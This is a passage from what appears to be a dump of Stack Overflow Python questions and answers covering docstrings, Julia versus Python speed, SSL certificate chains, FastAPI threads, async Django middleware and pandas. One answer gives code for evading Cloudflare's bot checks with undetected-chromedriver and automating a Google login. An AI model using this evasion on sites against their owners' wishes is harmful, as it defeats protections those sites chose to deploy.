            vector_bias    = low+np.ones_like(base)*i*((high-low)/l_i)
            vectors.append(vector_dynamic+vector_bias)
    return np.array(vectors)


def levels(total):
    '''
    create a sequence of stritcly increasing numbers summing up to the total.
    '''
    l = []
    sum_l = 0
    i = 1
    while sum_l &lt; total:
        l.append(i)
        i +=1
        sum_l = sum(l)
    i = 0
    while sum_l &gt; total:
        l[i] -= 1
        if l[i] == 0:
            l.pop(i)
        else:
            i += 1
        if i == len(l):
            i = 0
        sum_l = sum(l)
    return l
        
n_rm = R-1 # number of matrix subsections
m_rm = M//n_rm
len_rms = [ M//n_rm for i in range(n_rm)]
len_rms[-1] += M%n_rm
rm_list = []
for len_rm in len_rms:
    # create a matrix with uniform entries with rank 2
    # out of the vector 'base[i]' and a ones vector.
    rm_list.append(build_staircase(
        base = base[i], 
        num_stairs = len_rms[i], 
        low = low,
        high = high,
    ))

rm = np.concatenate(rm_list)
plt.hist(rm.flatten(), bins = 100)
</code></pre>
<p>A few examples:<br />
<a href=""https://i.stack.imgur.com/b1mdb.png"" rel=""nofollow noreferrer""><img src=""https://i.stack.imgur.com/b1mdb.png"" alt=""enter image description here"" /></a>
<a href=""https://i.stack.imgur.com/m4FHU.png"" rel=""nofollow noreferrer""><img src=""https://i.stack.imgur.com/m4FHU.png"" alt=""enter image description here"" /></a>
<a href=""https://i.stack.imgur.com/PFoO4.png"" rel=""nofollow noreferrer""><img src=""https://i.stack.imgur.com/PFoO4.png"" alt=""enter image description here"" /></a></p>
<p>and now with N = 1000, M = 6000 to empirically demonstrate the nearly asymptotic behavior:
<a href=""https://i.stack.imgur.com/06DzM.png"" rel=""nofollow noreferrer""><img src=""https://i.stack.imgur.com/06DzM.png"" alt=""enter image description here"" /></a>
<a href=""https://i.stack.imgur.com/k3MlQ.png"" rel=""nofollow noreferrer""><img src=""https://i.stack.imgur.com/k3MlQ.png"" alt=""enter image description here"" /></a>
<a href=""https://i.stack.imgur.com/EwmBF.png"" rel=""nofollow noreferrer""><img src=""https://i.stack.imgur.com/EwmBF.png"" alt=""enter image description here"" /></a></p>
"
"70863543","1","Can a Python docstring be calculated (f-string or %-expression)?","<p>Is it possible to have a Python docstring calculated? I have a lot of repetitive things in my docstrings, so I'd like to either use f-strings or a %-style format expression.</p>
<p>When I use an f-string at the place of a docstring</p>
<ul>
<li>importing the module invokes the processing</li>
<li>but when I check the <code>__doc__ </code>of such a function it is empty</li>
<li>sphinx barfs when the docstring is an f-string</li>
</ul>
<p>I do know how to process the docstrings after the import, but that doesn't work for object 'doc' strings which is recognized by sphinx but is not a real <code>__doc__</code>'s of the object.</p>
","70865657","<p>Docstrings in Python must be regular string literals.</p>
<p>This is pretty easy to test - the following program does not show the docstring:</p>
<pre><code>BAR = &quot;Hello world!&quot;

def foo():
        f&quot;&quot;&quot;This is {BAR}&quot;&quot;&quot;
        pass

assert foo.__doc__ is None
help(foo)

</code></pre>
<p>The Python syntax docs say that <a href=""https://docs.python.org/3/reference/compound_stmts.html#id19"" rel=""noreferrer"">the docstring must be a &quot;string literal&quot;</a>, and the tail end of <a href=""https://docs.python.org/3/reference/lexical_analysis.html#formatted-string-literals"" rel=""noreferrer"">the f-string reference</a> says they &quot;cannot be used as docstrings&quot;.</p>
<p>So unfortunately you must use the <code>__doc__</code> attribute.</p>
<p>However, you should be able to use a decorator to read the <code>__doc__</code> attribute and replace it with whatever you want.</p>
"
"70987896","1","Why is this task faster in Python than Julia?","<p>I ran the following code in RStudio:</p>
<pre><code>exo &lt;- read.csv('exoplanets.csv',TRUE,&quot;,&quot;)
df &lt;- data.frame(exo)

ranks &lt;- 570
files &lt;- 3198
datas &lt;- vector()

for ( w in 2:files ) {
    listas &lt;-vector()
    for ( i in 1:ranks) {
            name &lt;- as.character(df[i,w])
            listas &lt;- append (listas, name)
    }
    datas &lt;- append (datas, listas)
}
</code></pre>
<p>It reads a huge NASA CSV file, converts it to a dataframe,
converts each element to string, and adds them to a vector.</p>
<p>RStudio took 4 min and 15 seconds.</p>
<p>So I decided to implement the same code in Julia.
I ran the following in VS Code:</p>
<pre><code>using CSV, DataFrames

df = CSV.read(&quot;exoplanets.csv&quot;, DataFrame)

fil, col = 570, 3198
arr = []

for i in 2:fil
        for j in 1:col
            push!(arr, string(df[i, j]))
        end
end
</code></pre>
<p>The result was good.
The Julia code took only 1 minute and 25 seconds!</p>
<p>Then for pure curiosity I implemented the same code
this time in Python to compare.
I ran the following in VS Code:</p>
<pre><code>import numpy as np
import pandas as pd

exo = pd.read_csv(&quot;exoplanets.csv&quot;)
arr = np.array(exo)

fil, col = 570, 3198
lis = []

for i in range(1, fil):
        for j in range(col):
            lis.append(arr[i][j].astype('str'))
</code></pre>
<p>The result shocked me! Only 35 seconds!!!
And in Spyder from Anaconda only 26 seconds!!!
Almost 2 million floats!!!
Is Julia slower than Python in data analysis?
Can I improve the Julia code?</p>
","70988453","<p><strong>NOTE:</strong> I wrote the below assuming you want the other column order (as in the Python and R examples).  It is more efficient in Julia this way; to make it work equivalently to your original behaviour, permute the logic or your data at the right places (left as an exercise). Bogumił's anwer does the right thing already.</p>
<hr />
<p>Put stuff into functions, preallocate where possible, iterate in stride order, use views, and use builtin functions and broadcasting:</p>
<pre><code>function tostringvector(d)
    r, c = size(d)
    result = Vector{String}(undef, r*c)
    v = reshape(result, r, c)
    for (rcol, dcol) in zip(eachcol(v), eachcol(d))
        @inbounds rcol .= string.(dcol)
    end
    return result
end
</code></pre>
<p>Which certainly can be optimized harder.</p>
<p>Or shorter, making use of what <code>DataFrames</code> already provides:</p>
<pre><code>tostringvector(d) = vec(Matrix(string.(d)))
</code></pre>
"
"70977935","1","Why do I receive 'unable to get local issuer certificate (_ssl.c:997)'","<p>When sending a request to a specific URL I get an SSL error and I am not sure why. First please see the error message I am presented with:</p>
<pre><code>requests.exceptions.SSLError: HTTPSConnectionPool(host='dicmedia.korean.go.kr', port=443): Max retries exceeded with url: /multimedia/naver/2016/40000/35000/14470_byeon-gyeong.wav (Caused by SSLError(SSLCertVerificationError(1, '[SSL: CERTIFICATE_VERIFY_FAILED] certificate verify failed: unable to get local issuer certificate (_ssl.c:997)')))
</code></pre>
<p>I searched unsuccessfully to different Stackoverflow questions for the last two days:</p>
<p>I already tried:</p>
<ul>
<li><a href=""https://github.com/Unbabel/COMET/issues/29"" rel=""noreferrer"">https://github.com/Unbabel/COMET/issues/29</a> (This seems to be related with an internal update Python received relating to the use of specific SSL certificates (not an expert here)</li>
<li>Downloading the certificate in question and directly linking to it with <code>verify=&quot;private/etc/ssl/certs&quot;</code></li>
</ul>
<p>I am honestly at loss why I receive this error. As the error message itself indicates it seems that the server in question could get my local certificates somehow. The script worked until a week before. I did not update Python before then. Right now I use python 3.10.2 downloaded from the official website.</p>
<p>I don't want to set <code>verify=False</code> as this just skips the verification process and leaves me vulnerable as numerous people already pointed out at different questions. Besides that it really bothers me that I can't resolve the error.</p>
<p>Any help is much appreciated. See the specific request:</p>
<pre><code>import requests

def request(url):
    response = requests.get(url, verify=&quot;/private/etc/ssl/certs&quot;)
    print(response)

request(&quot;https://dicmedia.korean.go.kr/multimedia/naver/2016/40000/35000/14470_byeon- 
gyeong.wav&quot;)
</code></pre>
","70997594","<p>After a lot of googling I figured out the solution myself:</p>
<p>The problem - so it seems - was not all certificates needed where included in Pythons <em>cacert.pem</em> file. As I indicated in my question above to tackle this I downloaded the <em>certifi</em> module at first. As this didn't work out as well I suppose <em>certifi</em> missed the necessary certificates as well.</p>
<p><strong>But</strong> I suppose not all certificates in the certificate where missing. As answers to similar <a href=""https://stackoverflow.com/questions/42982143/python-requests-how-to-use-system-ca-certificates-debian-ubuntu"">questions</a> indicated as well mostly what is missing is not the entire chain, but only the intermediate certificates.</p>
<p>After:</p>
<p><strong>1.</strong> downloading the necessary certificates (see the lock symbol in your browser; if you're on OSX you need to drag and drop the big images of the certificates to your finder or desktop etc.),</p>
<p><strong>2.</strong> <a href=""https://serverfault.com/questions/254627/how-do-i-convert-a-cer-certificate-to-pem"">converting</a> them to <em>.perm</em> files and bundling them together: <code>cat first_cert.pem second_cert.pem &gt; combined_cert.pem </code></p>
<p>and</p>
<p><strong>3.</strong> providing the specific path of the bundled certificates as indicated in my question: <code>verify=&quot;private/etc/ssl/certs</code> (you may of course choose a different file path).</p>
<p>my request got accepted by the server.</p>
<p>I guess my mistake when trying this solution was that I didn't download the entire chain at first, but only the last certificate.</p>
<p>I really hope this helps someone else as a point of reference.</p>
<p>What I am still dying to know though, is why the error popped up in the first place. I didn't change my script at all and use it on a regular basis, but suddenly got presented with said error. Was the reason that the server I tried to reach change its certificates?</p>
<p>Apologies if my terminology is incorrect.</p>
"
"71518406","1","How to bypass cloudflare browser checking selenium Python","<p>I am trying to access a site using selenium Python.
But the site is checking and checking continuously by cloudflare.
No other page is coming.</p>
<p>Check the screenshot here.</p>
<p><a href=""https://i.stack.imgur.com/PuCfK.jpg"" rel=""noreferrer""><img src=""https://i.stack.imgur.com/PuCfK.jpg"" alt=""enter image description here"" /></a></p>
<p>I have tried undetected chrome but it is not working at all.</p>
","71518481","<p>By undetected chrome do you mean undetected chromedriver?:</p>
<p>Anyways, undetected-chromedriver works for me:</p>
<h2>Undetected chromedriver</h2>
<p>Github: <a href=""https://github.com/ultrafunkamsterdam/undetected-chromedriver"" rel=""noreferrer"">https://github.com/ultrafunkamsterdam/undetected-chromedriver</a></p>
<pre><code>pip install undetected-chromedriver
</code></pre>
<h3>Code that gets a cloudflare protected site:</h3>
<pre><code>import undetected_chromedriver as uc
driver = uc.Chrome(use_subprocess=True)
driver.get('https://nowsecure.nl')
</code></pre>
<h3>My POV</h3>
<p><a href=""https://i.stack.imgur.com/5ZryO.png"" rel=""noreferrer""><img src=""https://i.stack.imgur.com/5ZryO.png"" alt=""enter image description here"" /></a>
<a href=""https://i.stack.imgur.com/wjl1i.png"" rel=""noreferrer""><img src=""https://i.stack.imgur.com/wjl1i.png"" alt=""enter image description here"" /></a></p>
<hr />
<h3>Quick setup code that logs into your google account:</h3>
<p>Github: <a href=""https://github.com/xtekky/google-login-bypass"" rel=""noreferrer"">https://github.com/xtekky/google-login-bypass</a></p>
<pre><code>import undetected_chromedriver as uc
from selenium.webdriver.common.by import By
from selenium.webdriver.support.ui import WebDriverWait
from selenium.webdriver.support import expected_conditions as EC

#  ---------- EDIT ----------
email = 'email\n' # replace email
password = 'password\n' # replace password
#  ---------- EDIT ----------

driver = uc.Chrome(use_subprocess=True)
wait = WebDriverWait(driver, 20)
url = 'https://accounts.google.com/ServiceLogin?service=accountsettings&amp;continue=https://myaccount.google.com%3Futm_source%3Daccount-marketing-page%26utm_medium%3Dgo-to-account-button'
driver.get(url)


wait.until(EC.visibility_of_element_located((By.NAME, 'identifier'))).send_keys(email)
wait.until(EC.visibility_of_element_located((By.NAME, 'password'))).send_keys(password)
print(&quot;You're in!! enjoy&quot;)

# [ ---------- paste your code here ---------- ]
</code></pre>
"
"71010343","1","Cannot load `swrast` and `iris` drivers in Fedora 35","<p>Essentially, trying to write the following code results in the error below:</p>
<h4>Code</h4>
<pre class=""lang-py prettyprint-override""><code>from matplotlib import pyplot as plt
plt.plot([1,2,3,2,1])
plt.show()
</code></pre>
<h4>Error</h4>
<pre><code>libGL error: MESA-LOADER: failed to open iris: /home/xxx/.conda/envs/stat/lib/python3.8/site-packages/pandas/_libs/window/../../../../../libstdc++.so.6: version `GLIBCXX_3.4.29' not found (required by /usr/lib64/dri/iris_dri.so) (search paths /usr/lib64/dri, suffix _dri)
libGL error: failed to load driver: iris
libGL error: MESA-LOADER: failed to open swrast: /home/xxx/.conda/envs/stat/lib/python3.8/site-packages/pandas/_libs/window/../../../../../libstdc++.so.6: version `GLIBCXX_3.4.29' not found (required by /usr/lib64/dri/swrast_dri.so) (search paths /usr/lib64/dri, suffix _dri)
libGL error: failed to load driver: swrast
</code></pre>
<p>I found similar errors on StackOverflow but none were what is needed here.</p>
","71010344","<p>Short answer: <code>export LD_PRELOAD=/usr/lib64/libstdc++.so.6</code></p>
<p>Long answer:</p>
<p>The underlying problem is that we have a piece of software that was built with an older C++ compiler. Part of the compiler is its implementation of <code>libstdc++</code> which becomes part of the runtime requirements for anything built by the compiler. The software in question has, evidently, brought its own, older implementation of <code>libstdc++</code> along for the ride, <em>and</em> given its <code>libstdc++</code> precedence over the system's <code>libstdc++</code>. Typically, this is done via the <code>$LD_LIBRARY_PATH</code> environment variable. Unfortunately, <code>/usr/lib64/dri/swrast_dri.so</code> is a piece of system software built by the native compiler for that system, and it's more recent than the compiler that built the other software in question. The result of this is that the older compiler's <code>libstdc++</code> gets loaded first, with its older, more limited symbol set. When it then wants to load <code>swrast</code>, this fails because <code>swrast</code> insists on having the level of compiler/runtime with which it was built. The solution to this whole mess is the force the system's (newer) <code>libstdc++</code> into use and prevent the older <code>libstdc++</code> from being brought into play. This is achieved via the code snippet <code>export LD_PRELOAD=/usr/lib64/libstdc++.so.6</code> where we set the preload environment variable.</p>
"
"70872276","1","FastAPI python: How to run a thread in the background?","<p>I'm making a server in python using FastAPI, and I want a function that is not related to my API, to run in background every 5 minutes (like checking stuff from an API and printing stuff depending on the response)</p>
<p>I've tried to make a thread that runs the function <code>start_worker</code>, but it doesn't print anything.</p>
<p>Does anyone know how to do so ?</p>
<pre class=""lang-py prettyprint-override""><code>def start_worker():
    print('[main]: starting worker...')
    my_worker = worker.Worker()
    my_worker.working_loop() # this function prints &quot;hello&quot; every 5 seconds

if __name__ == '__main__':
    print('[main]: starting...')
    uvicorn.run(app, host=&quot;0.0.0.0&quot;, port=8000, reload=True)
    _worker_thread = Thread(target=start_worker, daemon=False)
    _worker_thread.start()
</code></pre>
","70873984","<p>You should start your Thread before calling <code>uvicorn.run</code>, as <code>uvicorn.run</code> is blocking the thread.</p>
<p>PS: In your question you state that you would like the background task to run every 5 minutes, but in your code you say every 5 <strong>seconds</strong>. The below examples assume that is the latter you want. If you want it to be executed every 5 minutes instead, then adjust the time to <strong>60 * 5</strong>.</p>
<p><strong>Option 1</strong></p>
<pre><code>import time
import threading
from fastapi import FastAPI
import uvicorn

app = FastAPI()
class BackgroundTasks(threading.Thread):
    def run(self,*args,**kwargs):
        while True:
            print('Hello')
            time.sleep(5)
  
if __name__ == '__main__':
    t = BackgroundTasks()
    t.start()
    uvicorn.run(app, host=&quot;0.0.0.0&quot;, port=8000)
</code></pre>
<p>You could also start your thread using FastAPI's <a href=""https://fastapi.tiangolo.com/advanced/events/#startup-event"" rel=""noreferrer"">startup event</a>, as long as it is ok to run before the application starts.</p>
<pre><code>@app.on_event(&quot;startup&quot;)
async def startup_event():
    t = BackgroundTasks()
    t.start()
</code></pre>
<p><strong>Option 2</strong></p>
<p>You could instead use a repeating <a href=""https://docs.python.org/3/library/sched.html"" rel=""noreferrer"">Event scheduler</a> for the background task, as below:</p>
<pre><code>import sched, time
from threading import Thread
from fastapi import FastAPI
import uvicorn

app = FastAPI()
s = sched.scheduler(time.time, time.sleep)

def print_event(sc): 
    print(&quot;Hello&quot;)
    sc.enter(5, 1, print_event, (sc,))

def start_scheduler():
    s.enter(5, 1, print_event, (s,))
    s.run()

@app.on_event(&quot;startup&quot;)
async def startup_event():
    thread = Thread(target = start_scheduler)
    thread.start()

if __name__ == '__main__':
    uvicorn.run(app, host=&quot;0.0.0.0&quot;, port=8000)
</code></pre>
"
"70864474","1","Uvicorn async workers are still working synchronously","<p><strong>Question in short</strong></p>
<p>I have migrated my project from Django 2.2 to Django 3.2, and now I want to start using the possibility for asynchronous views. I have created an async view, setup asgi configuration, and run gunicorn with a Uvicorn worker. When swarming this server with 10 users concurrently, they are served synchronously. What do I need to configure in order to serve 10 concurrent users an async view?</p>
<p><strong>Question in detail</strong></p>
<p>This is what I did so far in my local environment:</p>
<ul>
<li>I am working with Django 3.2.10 and Python 3.9.</li>
<li>I have installed <code>gunicorn</code> and <code>uvicorn</code> through pip</li>
<li>I have created an <code>asgi.py</code> file with the following contents</li>
</ul>
<pre><code>    import os
    from django.core.asgi import get_asgi_application
    os.environ.setdefault('DJANGO_SETTINGS_MODULE', 'MyService.settings.local')
    application = get_asgi_application()
</code></pre>
<ul>
<li>I have created a view with the following implementation, and connected it in <code>urlpatterns</code>:</li>
</ul>
<pre><code>    import asyncio
    import json
    from django.http import HttpResponse
    
    async def async_sleep(request):
        await asyncio.sleep(1)
        return HttpResponse(json.dumps({'mode': 'async', 'time': 1).encode())
</code></pre>
<ul>
<li>I run locally a gunicorn server with a Uvicorn worker:</li>
</ul>
<pre><code>gunicorn MyService.asgi:application -k uvicorn.workers.UvicornWorker
[2022-01-26 14:37:14 +0100] [8732] [INFO] Starting gunicorn 20.1.0
[2022-01-26 14:37:14 +0100] [8732] [INFO] Listening at: http://127.0.0.1:8000 (8732)
[2022-01-26 14:37:14 +0100] [8732] [INFO] Using worker: uvicorn.workers.UvicornWorker
[2022-01-26 14:37:14 +0100] [8733] [INFO] Booting worker with pid: 8733
[2022-01-26 13:37:15 +0000] [8733] [INFO] Started server process [8733]
[2022-01-26 13:37:15 +0000] [8733] [INFO] Waiting for application startup.
[2022-01-26 13:37:15 +0000] [8733] [INFO] ASGI 'lifespan' protocol appears unsupported.
[2022-01-26 13:37:15 +0000] [8733] [INFO] Application startup complete.
</code></pre>
<ul>
<li>I hit the API from a local client once. After 1 second, I get a 200 OK, as expected.</li>
<li>I set up a locust server to spawn concurrent users. When I let it make requests with 1 concurrent user, every 1 second an API call is completed.</li>
<li>When I let it make requests with 10 concurrent users, every 1 second an API call is completed. All other requests are waiting.</li>
</ul>
<p>This last thing is not what I expect. I expect the worker, while sleeping asynchronously, to pick up the next request already. Am I missing some configuration?</p>
<p>I also tried it by using Daphne instead of Uvicorn, but with the same result.</p>
<p><strong>Locust</strong></p>
<p>This is how I have set up my locust.</p>
<ul>
<li>Start a new virtualenv</li>
<li><code>pip install locust</code></li>
<li>Create a <code>locustfile.py</code> with the following content:</li>
</ul>
<pre><code>from locust import HttpUser, task
class SleepUser(HttpUser):
    @task
    def async_sleep(self):
        self.client.get('/api/async_sleep/')
</code></pre>
<ul>
<li>Run the locust executable from the shell</li>
<li>Visit <a href=""http://0.0.0.0:8089"" rel=""nofollow noreferrer"">http://0.0.0.0:8089</a> in the browser</li>
<li>Set number of workers to 10, spawn rate to 1 and host to <a href=""http://127.0.0.1:8000"" rel=""nofollow noreferrer"">http://127.0.0.1:8000</a></li>
</ul>
<p><strong>Middleware</strong></p>
<p>These are my middleware settings</p>
<pre><code>MIDDLEWARE = [
    'django_prometheus.middleware.PrometheusBeforeMiddleware',
    'corsheaders.middleware.CorsMiddleware',
    'django.middleware.gzip.GZipMiddleware',
    'django.contrib.sessions.middleware.SessionMiddleware',
    'django.middleware.common.CommonMiddleware',
    'django.middleware.csrf.CsrfViewMiddleware',
    'django.contrib.auth.middleware.AuthenticationMiddleware',
    'django.contrib.messages.middleware.MessageMiddleware',
    'django.middleware.clickjacking.XFrameOptionsMiddleware',
    'django.middleware.security.SecurityMiddleware',
    'shared.common.middleware.ApiLoggerMiddleware',
    'django_prometheus.middleware.PrometheusAfterMiddleware',
]
</code></pre>
<p>The ApiLoggerMiddleware from shared is from our own code, I will investigate this one first. This is the implementation of it.</p>
<pre><code>import logging
import os
from typing import List

from django.http import HttpRequest, HttpResponse
from django.utils import timezone

from shared.common.authentication_service import BaseAuthenticationService


class ApiLoggerMiddleware:
    TOO_BIG_FOR_LOG_BYTES = 2 * 1024

    def __init__(self, get_response):
        # The get_response callable is provided by Django, it is a function
        # that takes a request and returns a response. Plainly put, once we're
        # done with the incoming request, we need to pass it along to get the
        # response which we need to ultimately return.
        self._get_response = get_response
        self.logger = logging.getLogger('api')
        self.pid = os.getpid()
        self.request_time = None
        self.response_time = None

    def __call__(self, request: HttpRequest) -&gt; HttpResponse:
        common_data = self.on_request(request)
        response = self._get_response(request)
        self.on_response(response, common_data)
        return response

    def truncate_body(self, request: HttpRequest) -&gt; str:
        return f&quot;{request.body[:self.TOO_BIG_FOR_LOG_BYTES]}&quot;

    def on_request(self, request: HttpRequest) -&gt; List[str]:
        self.request_time = timezone.now()

        remote_address = self.get_remote_address(request)
        user_agent = request.headers.get('User-Agent') or ''
        customer_uuid = self.get_customer_from_request_auth(request)
        method = request.method
        uri = request.get_raw_uri()

        common = [
            remote_address,
            user_agent,
            customer_uuid,
            method,
            uri
        ]

        in_line = [
                      &quot;IN&quot;,
                      str(self.pid),
                      str(self.request_time),
                  ] + common + [
                      self.truncate_body(request)
                  ]

        self.logger.info(', '.join(in_line))
        return common

    def on_response(self, response: HttpResponse, common: List[str]) -&gt; None:
        self.response_time = timezone.now()

        out_line = [
                       &quot;OUT&quot;,
                       str(self.pid),
                       str(self.response_time)
                   ] + common + [
                       str(self.response_time - self.request_time),
                       str(response.status_code),
                   ]
        self.logger.info(&quot;, &quot;.join(out_line))

    @classmethod
    def get_customer_from_request_auth(cls, request: HttpRequest) -&gt; str:
        token = request.headers.get('Authorization')
        if not token:
            return 'no token'
        try:
            payload = BaseAuthenticationService.validate_access_token(token)
            return payload.get('amsOrganizationId', '')
        except Exception:
            return 'unknown'

    @classmethod
    def get_remote_address(cls, request: HttpRequest) -&gt; str:
        if 'X-Forwarded-For' in request.headers:
            # in case the request comes in through a proxy, the remote address
            # will be just the last proxy that passed it along, that's why we
            # have to get the remote from X-Forwarded-For
            # https://developer.mozilla.org/en-US/docs/Web/HTTP/Headers/X-Forwarded-For
            addresses = request.headers['X-Forwarded-For'].split(',')
            client = addresses[0]
            return client
        else:
            return request.META.get('REMOTE_ADDR', '')
</code></pre>
<p><strong>Sources</strong></p>
<p>Sources I have used:</p>
<ul>
<li><a href=""https://arunrocks.com/a-guide-to-asgi-in-django-30-and-its-performance/"" rel=""nofollow noreferrer"">A Guide to ASGI in Django 3.0 and its performance</a></li>
<li><a href=""https://docs.djangoproject.com/en/3.2/howto/deployment/asgi/uvicorn/"" rel=""nofollow noreferrer"">How to use Django with Uvicorn</a></li>
</ul>
","71023739","<p>Your <code>ApiLoggerMiddleware</code> is a synchronous middleware.</p>
<p>From <a href=""https://docs.djangoproject.com/en/4.0/topics/async/#async-views"" rel=""noreferrer"">https://docs.djangoproject.com/en/4.0/topics/async/#async-views</a>, <strong>emphasis</strong> mine:</p>
<blockquote>
<p>You will only get the benefits of a fully-asynchronous request stack if you have no synchronous middleware loaded into your site. <strong>If there is a piece of synchronous middleware, then Django must use a thread per request to safely emulate a synchronous environment for it.</strong></p>
<p>Middleware can be built to support both sync and async contexts. Some of Django’s middleware is built like this, but not all. <strong>To see what middleware Django has to adapt, you can turn on debug logging for the <code>django.request</code> logger and look for log messages about “Synchronous middleware … adapted”.</strong></p>
</blockquote>
<p>(The log message currently says &quot;Asynchronous middleware ... adapted&quot;, bug reported at <a href=""https://code.djangoproject.com/ticket/33495"" rel=""noreferrer"">#33495</a>.)</p>
<p>Turn on debug logging for the <code>django.request</code> logger  by adding this to your <code>LOGGING</code> setting:</p>
<pre class=""lang-py prettyprint-override""><code>'django.request': {
    'handlers': ['console'],
    'level': 'DEBUG',
},
</code></pre>
<h1>Solution</h1>
<p>To make <code>ApiLoggerMiddleware</code> asynchronous:</p>
<ol>
<li>Inherit <code>django.utils.deprecation.MiddlewareMixin</code>.
<ul>
<li>call <code>super().__init__(get_response)</code> in <code>__init__</code>.</li>
<li>remove <code>__call__</code>; <code>MiddlewareMixin.__call__</code> makes your middleware asynchronous.</li>
</ul>
</li>
<li>Refactor <code>on_request</code> to <code>process_request</code>.
<ul>
<li>return <code>None</code> instead of <code>common</code>.</li>
<li>attach <code>common</code> to <code>request</code> instead: <code>request.common = common</code>.<br />
remember to update references to <code>request.common</code>.</li>
<li>attach <code>request_time</code> to <code>request</code> instead of <code>self</code> to make it (and the middleware) thread-safe.<br />
remember to update references to <code>request.request_time</code>.</li>
</ul>
</li>
<li>Refactor <code>on_response(self, response, common)</code> to <code>process_response(self, request, response)</code>.
<ul>
<li>return <code>response</code>.</li>
<li>don't attach <code>response_time</code> to <code>self</code>; leave it as a variable since it's not used in other functions.</li>
</ul>
</li>
</ol>
<p>The result:</p>
<pre class=""lang-py prettyprint-override""><code>class ApiLoggerMiddleware(MiddlewareMixin):
    TOO_BIG_FOR_LOG_BYTES = 2 * 1024

    def __init__(self, get_response):
        # The get_response callable is provided by Django, it is a function
        # that takes a request and returns a response. Plainly put, once we're
        # done with the incoming request, we need to pass it along to get the
        # response which we need to ultimately return.
        super().__init__(get_response)  # +
        self._get_response = get_response
        self.logger = logging.getLogger('api')
        self.pid = os.getpid()
        # self.request_time = None   # -
        # self.response_time = None  # -

    # def __call__(self, request: HttpRequest) -&gt; HttpResponse:  # -
    #     common_data = self.on_request(request)                 # -
    #     response = self._get_response(request)                 # -
    #     self.on_response(response, common_data)                # -
    #     return response                                        # -

    def truncate_body(self, request: HttpRequest) -&gt; str:
        return f&quot;{request.body[:self.TOO_BIG_FOR_LOG_BYTES]}&quot;

    # def on_request(self, request: HttpRequest) -&gt; List[str]:  # -
    def process_request(self, request: HttpRequest) -&gt; None:    # +
        # self.request_time = timezone.now()   # -
        request.request_time = timezone.now()  # +

        remote_address = self.get_remote_address(request)
        user_agent = request.headers.get('User-Agent') or ''
        customer_uuid = self.get_customer_from_request_auth(request)
        method = request.method
        uri = request.get_raw_uri()

        common = [
            remote_address,
            user_agent,
            customer_uuid,
            method,
            uri
        ]

        in_line = [
            &quot;IN&quot;,
            str(self.pid),
            # str(self.request_time),   # -
            str(request.request_time),  # +
        ] + common + [
            self.truncate_body(request)
        ]

        self.logger.info(', '.join(in_line))
        # return common          # -
        request.common = common  # +
        return None              # +

    # def on_response(self, response: HttpResponse, common: List[str]) -&gt; None:                # -
    def process_response(self, request: HttpRequest, response: HttpResponse) -&gt; HttpResponse:  # +
        # self.response_time = timezone.now()  # -
        response_time = timezone.now()         # +

        out_line = [
            &quot;OUT&quot;,
            str(self.pid),
            # str(self.response_time)  # -
            str(response_time)         # +
            # ] + common + [                    # -
        ] + getattr(request, 'common', []) + [  # +
            # str(self.response_time - self.request_time),             # -
            str(response_time - getattr(request, 'request_time', 0)),  # +
            str(response.status_code),
        ]
        self.logger.info(&quot;, &quot;.join(out_line))
        return response  # +

    @classmethod
    def get_customer_from_request_auth(cls, request: HttpRequest) -&gt; str:
        token = request.headers.get('Authorization')
        if not token:
            return 'no token'
        try:
            payload = BaseAuthenticationService.validate_access_token(token)
            return payload.get('amsOrganizationId', '')
        except Exception:
            return 'unknown'

    @classmethod
    def get_remote_address(cls, request: HttpRequest) -&gt; str:
        if 'X-Forwarded-For' in request.headers:
            # in case the request comes in through a proxy, the remote address
            # will be just the last proxy that passed it along, that's why we
            # have to get the remote from X-Forwarded-For
            # https://developer.mozilla.org/en-US/docs/Web/HTTP/Headers/X-Forwarded-For
            addresses = request.headers['X-Forwarded-For'].split(',')
            client = addresses[0]
            return client
        else:
            return request.META.get('REMOTE_ADDR', '')
</code></pre>
"
"70935209","1","how to explode dynamically using pandas column?","<p>I have a dataframe that looks like this</p>
<pre><code>import pandas as pd
import numpy as np
# Create data set.
dataSet = {'id': ['A', 'A', 'B'],
           'id_2': [1, 2, 1] ,
           'number': [320, 169, 120],
           'add_number' : [4,6,3]}

# Create dataframe with data set and named columns.
df = pd.DataFrame(dataSet, columns= ['id', 'id_2','number', 'add_number'])

    id  id_2    number  add_number
0   A   1        320       4
1   A   2        169       6
2   B   1        120       3
</code></pre>
<p>I would like use number and add_number so that I can explode this dynamically, ie) 320 + 4 would have [320,321,322,323,324] (up to 324, and would like to explode on this)</p>
<p><strong>DESIRED OUTPUT</strong></p>
<pre><code>    id  id_2    number
0   A   1        320       
1   A   1        321       
2   A   1        322
3   A   1        323
4   A   1        324
5   A   2        169
6   A   2        170
7   A   2        171
8   A   2        172
9   A   2        173
10  A   2        174
11  A   2        175
12  B   1        120
13  B   1        121
14  B   1        122
15  B   1        123
</code></pre>
<p>I looked over explode, wide_to_long pandas function, but I do not know where to start, any sense of direction would be appreciated!!</p>
","70935300","<p>You try using <code>np.arange</code> and <code>explode</code>:</p>
<pre><code>df['range'] = df.apply(lambda x: np.arange(x['number'], x['number']+x['add_number']+1), axis=1)
df.explode('range')
</code></pre>
<p>or</p>
<pre><code>df['range'] = [np.arange(n, n+a+1) for n, a in zip(df['number'],df['add_number'])] 
df.explode('range')
</code></pre>
<p>Output:</p>
<pre><code>  id  id_2  number  add_number range
0  A     1     320           4   320
0  A     1     320           4   321
0  A     1     320           4   322
0  A     1     320           4   323
0  A     1     320           4   324
1  A     2     169           6   169
1  A     2     169           6   170
1  A     2     169           6   171
1  A     2     169           6   172
1  A     2     169           6   173
1  A     2     169           6   174
1  A     2     169           6   175
2  B     1     120           3   120
2  B     1     120           3   121
2  B     1     120           3   122
2  B     1     120           3   123
</code></pre>
"
"70966298","1","Python Black code formatter doesn't format docstring line length","<p>I am running the Black code formatter against a Python script however it doesn't reformat the line length for docstrings. For example, given the following code:</p>
<pre><code>def my_func():
    &quot;&quot;&quot;
    This is a really long docstring. This is a really long docstring. This is a really long docstring. This is a really long docstring. This is a really long docstring. This is a really long docstring.
    &quot;&quot;&quot;
    return
</code></pre>
<p>When running Black against this script, the line length does not change. How can I ensure docstrings get formatted when running Black?</p>
","71041192","<p>maintainer here! :wave:</p>
<p>The short answer is <strong>no you cannot configure Black to fix line length issues in docstrings currently.</strong></p>
<p>It's not likely Black will split or merge lines in docstrings as it would be far too risky, structured data can and does exist in docstrings. While I would hope the added newlines wouldn't break the consumers it's still a valid concern.</p>
